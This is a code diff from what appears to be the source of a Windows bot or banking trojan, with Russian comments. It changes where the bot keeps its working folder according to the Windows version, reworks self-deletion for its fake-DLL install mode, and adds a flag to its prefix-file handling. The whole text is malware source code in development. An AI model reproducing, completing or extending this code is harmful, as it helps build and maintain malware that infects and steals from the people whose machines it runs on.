@@ -317,34 +317,6 @@ PCHAR TBotApplication::GetWorkFolder()
 	return BOT_WORK_FOLDER_NAME;
 }
 //----------------------------------------------------------------------------
-/*
-string TBotApplication::MakeWorkPath(bool SystemPath)
-{
-	// Функция генерирует рабочий путь
-	string Result;
-
-	TMemory Path(MAX_PATH);
-	if (!pSHGetSpecialFolderPathA(NULL, Path.Buf(), CSIDL_APPDATA, TRUE))
-		return Result;
-
-	if (SystemPath)
-	{
-		// Получаем путь в системной папке
-		PCHAR Tmp = STRA::Scan(Path.AsStr(), ':');
-		if (Tmp == NULL) return Result;
-		Tmp++;
-		*Tmp = 0;
-	}
-
-	Result = Path.AsStr();
-	Result += "\\";
-	Result += GetWorkFolder();
-	Result += "\\";
-
-	return Result;
-}
-//----------------------------------------------------------------------------
-*/
 
 string TBotApplication::MakeWorkPath()
 {
@@ -652,15 +624,27 @@ string BOT::GetBotPath()
 {
 	if (BotData->BotPath.IsEmpty())
 	{
+
+		int CSIDL =  CSIDL_COMMON_APPDATA;
+
+
+		// Временный патч. В Висте и старше получаем папку текущего юзера
+		OSVERSIONINFOEXA OSVersion;
+
+		OSVersion.dwOSVersionInfoSize = sizeof( OSVERSIONINFOEXA );
+
+		if (pGetVersionExA( (OSVERSIONINFOA*)&OSVersion ) )
+		{
+			if ( OSVersion.dwMajorVersion >= 6 )
+			{
+            	CSIDL =  CSIDL_APPDATA;
+            }
+		}
+
+
+
 		// Создаём путь
-//		TMemory Path(MAX_PATH);
-//		if (pExpandEnvironmentStringsA("%AllUsersProfile%\\", Path.Buf(), MAX_PATH))
-//		{
-//			BotData->BotPath =  Path.AsStr();
-//        }
-
-		BotData->BotPath =  GetSpecialFolderPathA(CSIDL_COMMON_APPDATA, NULL);
-
+		BotData->BotPath =  GetSpecialFolderPathA(CSIDL, NULL);
 	}
 	return BotData->BotPath;
 }
@@ -1101,11 +1085,15 @@ void BOT::Delete()
 	bool deleted = false;
 	switch( BOT::GetBotType() )
 	{
-#ifdef BOTPLUG
+
 		case BotFakeDll:
-			deleted = FakeDllDelete();
-			break;
-#endif
+			{
+				#ifdef BOTPLUG
+					deleted = FakeDllDelete();
+				#endif
+				break;
+			}
+
 	}
 
 	if( !deleted )
@@ -1185,17 +1173,20 @@ void BOT::SavePrefixToTemporaryFile()
 // Функция загружает префикс бота из временного файла
 // сохраняет его в рабочий файл и удаляет временный
 //----------------------------------------------------
-void BOT::SavePrefixFromTemporaryFile()
+void BOT::SavePrefixFromTemporaryFile(bool IgnoreIfExists)
 {
 	string TempName   = Bot->MakeFileName(NULL, GetStr(EStrTemporaryPrefixFileName).t_str());
 	if (File::IsExists(TempName.t_str()))
 	{
 		string PrefixFile = Bot->PrefixFileName();
-		DWORD Size = 0;
-		LPBYTE Prefix = File::ReadToBufferA(TempName.t_str(), Size);
-		if (Prefix && Size)
-			File::WriteBufferA(PrefixFile.t_str(), Prefix, Size);
-		MemFree(Prefix);
+		if (!IgnoreIfExists || !File::IsExists(PrefixFile.t_str()))
+		{
+			DWORD Size = 0;
+			LPBYTE Prefix = File::ReadToBufferA(TempName.t_str(), Size);
+			if (Prefix && Size)
+				File::WriteBufferA(PrefixFile.t_str(), Prefix, Size);
+			MemFree(Prefix);
+        }
 		pDeleteFileA(TempName.t_str());
     }
 }
